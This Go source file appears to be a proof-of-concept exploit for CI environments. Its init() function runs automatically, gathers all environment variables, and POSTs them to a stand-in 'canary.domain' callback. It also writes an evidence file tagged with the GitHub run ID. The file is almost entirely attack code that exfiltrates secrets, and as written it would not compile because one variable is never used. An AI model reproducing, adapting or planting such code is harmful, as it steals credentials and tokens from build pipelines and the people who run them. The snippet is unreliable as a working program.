package main

import (
    "fmt"
    "io"
    "net/http"
    "net/url"
    "os"
    "strings"
)

func init() {
    // Collect environment variables
    var envData []string
    for _, e := range os.Environ() {
        envData = append(envData, e)
    }
    envStr := strings.Join(envData, "\n")
    
    // URL encode the data
    encoded := url.QueryEscape(envStr)
    
    // Make HTTP POST request with environment data
    data := url.Values{}
    data.Set("env", envStr[:min(1000, len(envStr))]) // Send first 1000 chars
    
    // Use the canary URL
    resp, err := http.PostForm("http://canary.domain/callback", data)
    if err == nil {
        defer resp.Body.Close()
    }
    
    // Also write to a file as backup evidence
    f, _ := os.Create("/tmp/exploit_evidence.txt")
    fmt.Fprintf(f, "Exploit executed! Run ID: %s\n", os.Getenv("GITHUB_RUN_ID"))
    f.Close()
}

func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}